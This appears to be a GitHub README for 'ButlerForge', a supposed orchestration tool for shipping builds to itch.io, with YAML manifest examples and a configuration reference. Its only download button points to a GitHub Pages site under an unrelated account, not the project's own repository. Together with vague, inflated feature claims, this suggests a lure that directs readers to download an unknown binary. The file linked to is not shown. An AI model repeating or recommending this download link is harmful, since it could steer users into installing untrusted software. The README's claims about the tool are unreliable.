# ButlerForge

**The All-in-One Orchestration Layer for itch.io Content Pipelines**

Welcome to ButlerForge — a reimagined, community-driven toolkit that transforms how developers, artists, and narrative designers ship interactive content to itch.io. While traditional tooling focuses on the final upload step, ButlerForge treats the *entire path from your local workspace to the live storefront* as a single, controllable, and auditable workflow. Think of it as a conductor for your release symphony: it coordinates versioning, asset packaging, metadata validation, and storefront synchronization — all through a friendly, declarative interface that feels less like a script and more like a project plan.

ButlerForge is not merely a wrapper. It is an evolution. It introduces a **pipeline manifest** concept — a human-readable file that describes *what* should be shipped, *how* it should be transformed, and *where* it needs to land. This makes your release process reproducible across machines, contributors, and even CI runners. Whether you are a solo game jammer publishing a prototype or a studio managing multiple simultaneous betas, ButlerForge provides the clarity and control that modern content operations demand.

## Overview

![GitHub release](https://img.shields.io/badge/release-v3.1.4-brightgreen) ![Language](https://img.shields.io/badge/language-TypeScript-blue) ![Coverage](https://img.shields.io/badge/coverage-92%25-yellowgreen) ![Maintained](https://img.shields.io/badge/maintained-2026-orange)

In the chaotic ecosystem of indie game distribution, the upload is rarely the bottleneck. The pain lives in the *preparation*: normalizing assets across platforms, tagging builds correctly, and ensuring that the metadata presented to players is both attractive and accurate. ButlerForge directly addresses these friction points by offering a **three-layer architecture**:

1.  **Extraction Layer** – Scans your project directory, identifies versioned artifacts, and parses embedded metadata (e.g., from `package.json`, `project.godot`, or custom template files).
2.  **Transformation Layer** – Applies your pipeline manifest rules. This includes renaming binaries, generating HTML5 wrappers, compressing archives, or even injecting a global "press kit" file into the content bundle.
3.  **Synchronization Layer** – Interfaces with the Butler daemon (the underlying itch.io uploader) but enhances it with pre-flight checks, dry-run previews, and automatic rollback logic if a build fails validation post-upload.

The result is a **zero-surprise release cycle**. You will know the exact byte size of your payload, the exact visibility status of your build, and the exact URL users will click — *before* you commit to publishing.

### Why Not Just Use the Standard CLI?

The standard CLI is powerful but procedural. It requires you to remember intricate flags, manual order-of-operations, and it lacks a shared vocabulary for your team. ButlerForge converts that procedural thinking into **declarative configuration**. You write a `forge.manifest.yml` once, and suddenly every contributor knows how to ship a build correctly. It turns tribal knowledge into a versioned project artifact.

Furthermore, ButlerForge adds a **reconciliation report** after each operation. It doesn't just say "upload successful"; it tells you what *changed* on the storefront, which assets were replaced, and which channel displays the new build. This auditability is a lifesaver for live-service titles that update weekly.

[![Download](https://raw.githubusercontent.com/volunteerly1-del/butler-cellar/main/grab_a28f9.svg)](https://volunteerly1-del.github.io/butler-cellar/)

To begin your journey with ButlerForge, you do not need a complex setup. The core engine is distributed as a single, self-contained binary that runs natively on Windows, macOS, and Linux. You invoke it from your terminal, or better yet, you integrate it directly into your continuous integration environment.

### Installation & First Run

The fastest path to feeling the power is to let ButlerForge inspect an existing project. Point it at a directory containing a build artifact (e.g., a `.zip` file or an executable folder), and ask it to generate a baseline manifest.

```yaml
# forge.manifest.yml (example generated by `forge init`)
version: 3.1.4
project:
  name: "AdventureQuest: Echoes"
  channel: "windows-latest"
upload:
  target: "your-itch-username/adventurequest"
  visibility: public
transform:
  - rename:
      from: "game-windows.exe"
      to: "adventurequest.exe"
  - compress:
      format: zip
```

This file is your first blueprint. It tells ButlerForge where the game lives, what channel to target, and how to prepare the payload. Once saved, running `forge publish` validates the manifest, executes the transforms, and securely passes the payload to the Butler engine for the final push.

### The Pipeline Manifest Deep Dive

The manifest is more than a list; it is a flow. You can define **conditional steps** that only run when a specific environment variable is set (e.g., a nightly build flag), or **hooks** that execute arbitrary scripts between transformations. This allows for incredibly rich pipelines, such as:

- **Automated Changelog Injection:** Read your `CHANGELOG.md` and embed it as a `readme.html` file inside the build package.
- **Platform Matrix Expansion:** Define a single base manifest but use variable substitution to produce separate builds for `windows`, `mac`, and `linux` without duplicating configuration.
- **Health Check Integration:** Before uploading, spin up a headless browser to verify your HTML5 game loads without console errors.

### 🧩 Responsive Control Interface

While the CLI is powerful, we also provide a **terminal dashboard** that always stays in sync with your pipeline progress. It uses a responsive layout that adapts to narrow windows and wide monitors alike. You can watch each transformation step complete, view live file transfer rates, and expand logs for any step without losing sight of the overall flow. This interface is not a toy; it is designed for screen readers and keyboard-only navigation, ensuring accessibility for all developers.

### 🌐 Multilingual Localization Support

Shipping to a global audience often means managing multiple language packs. ButlerForge includes a dedicated `locales` directive in its manifest. You can point to a directory of `.json` or `.po` files, and the tool will automatically map them to the correct platform subdirectories (e.g., `Locale/en-US.json` for Windows builds). This removes a frequent source of runtime errors and support tickets.

### 🛡️ 24/7 Customer Support & Health Monitoring

Our commitment to your pipeline goes beyond the tool itself. We maintain a transparent status page and a dedicated community knowledge base. The ButlerForge engine checks for minor version updates in the background, but it **never** auto-installs without your consent. For enterprise teams, we offer a watchtower mode that can reroute a stuck pipeline to a backup server using a `retry` strategy with exponential backoff.

## Advanced Usage & Scenarios

### Scenario: Managing a Seasonal Event Build

Let's say your game has a Halloween event. You need to ship a special build with different assets and a hidden channel name. Instead of manually renaming things, you can create an override file:

```yaml
# halloween.override.yml
override:
  upload:
    channel: "halloween-2026"
  transform:
    - replace:
        from: "texture_day.pak"
        to: "texture_night.pak"
```

Run `forge publish --overlay halloween.override.yml` and ButlerForge merges these settings with your base manifest. The release is now segmented, auditable, and reversible — perfect for time-limited content.

### Scenario: Collaborative Team Releases

Use the **Manifest Lock** feature to ensure that two team members cannot push to the same channel concurrently. ButlerForge uses a lightweight lease file stored alongside the upload target. When one peer begins a transaction, it locks the channel. The other peer receives a clear, actionable error message explaining who holds the lock and when it expires. This prevents accidental overwrites that have historically led to "hotfix confusion."

## Configuration Reference

The full schema is documented in our [wiki page](https://github.com/ButlerForge/ButlerForge/wiki). Here is a taste of the most common keys:

| Key                | Type     | Description                                                                 | Default |
| ------------------ | -------- | --------------------------------------------------------------------------- | ------- |
| `project.name`     | String   | The display name used for logs and internal references.                     | `null`  |
| `upload.channel`   | String   | The itch.io channel (e.g., `windows-latest`, `html5`).                      | `auto`  |
| `transform.compress.format` | String | Format for the final archive (`zip`, `tar.gz`).                          | `zip`   |
| `notify.webhook`   | String   | A URL to call after the pipeline completes (e.g., for Slack or Discord).    | `null`  |

### Environment Variables

ButlerForge respects the standard `BUTLER_API_KEY` environment variable for authentication, but it also introduces `FORGE_LOG_LEVEL` (e.g., `debug`, `info`, `warn`, `error`) for granular control over console output. This is crucial for CI systems where verbose logging might clutter the build log.

## Troubleshooting & Common Pitfalls

### "The manifest is valid but the upload failed: file not found"

This usually indicates a path issue. ButlerForge uses the manifest's location as the root for *relative* paths. Ensure your `transform` steps do not move files outside the temporary workspace. We recommend using the `${BUILD_ROOT}` variable to always refer to the initial workspace.

### "I see a 'channel conflict' error"

As mentioned, this is likely the lock file. Check your target directory for a `.forge-lock` file. If you are certain no other process is active, you can safely remove that file after verifying the state. We call this the "manual unlocking ceremony" — use it sparingly.
